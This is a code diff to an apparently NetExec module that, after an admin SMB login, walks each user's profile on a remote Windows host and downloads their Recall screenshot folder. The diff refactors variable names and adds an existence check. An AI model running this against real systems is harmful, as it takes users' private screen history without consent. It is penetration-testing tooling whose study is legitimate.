@@ -26,33 +26,38 @@ class NXCModule:
     def options(self, context, module_options):
         self.context = context
         self.logger = context.log
-        self.recall_path = "\\AppData\\Local\\CoreAIPlatform.00\\UKP\\"
+        self.recall_path_stub = "\\AppData\\Local\\CoreAIPlatform.00\\UKP\\"
 
     def on_admin_login(self, context, connection):
         output_path = f"recall_{connection.host}"
         self.logger.debug("Getting all user Recall folders")
-        recall_folders = connection.conn.listPath("C$", "\\Users\\*")
-        self.logger.debug(f"Recall folders: {recall_folders}")
-        if not recall_folders:
-            self.logger.fail("No Recall folders found!")
+        user_folders = connection.conn.listPath("C$", "\\Users\\*")
+        self.logger.debug(f"User folders: {user_folders}")
+        if not user_folders:
+            self.logger.fail("No User folders found!")
         else:
-            self.logger.success("Recall folder(s) found, attempting to dump contents")
+            self.logger.success("User folder(s) found, attempting to dump Recall contents (no output means no Recall folder)")
         
-        for recall_folder in recall_folders:
-            if not recall_folder.is_directory():
+        for user_folder in user_folders:
+            if not user_folder.is_directory():
                 continue
-            folder_name = recall_folder.get_longname()
+            folder_name = user_folder.get_longname()
             self.logger.debug(f"Folder: {folder_name}")
             if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                 continue
             
-            full_path = ntpath.normpath(join(r"Users", folder_name, self.recall_path))
-            self.logger.debug(f"Getting Recall folder {full_path}")
+            recall_path = ntpath.normpath(join(r"Users", folder_name, self.recall_path_stub))
+            self.logger.debug(f"Checking Recall folder {recall_path}")
+            try:
+                connection.conn.listPath("C$", recall_path)
+            except Exception:
+                self.logger.debug(f"Recall folder {recall_path} not found!")
+                continue
             user_output_dir = join(output_path, folder_name)
             try:
-                connection.download_folder(full_path, user_output_dir, True)
+                connection.download_folder(recall_path, user_output_dir, True)
             except (smb.SessionError, smb3.SessionError):
-                self.logger.debug(f"Folder {full_path} not found!")
+                self.logger.debug(f"Folder {recall_path} not found!")
                 
             self.logger.success(f"Recall folder for user {folder_name} downloaded to {user_output_dir}")
             self.rename_screenshots(user_output_dir)
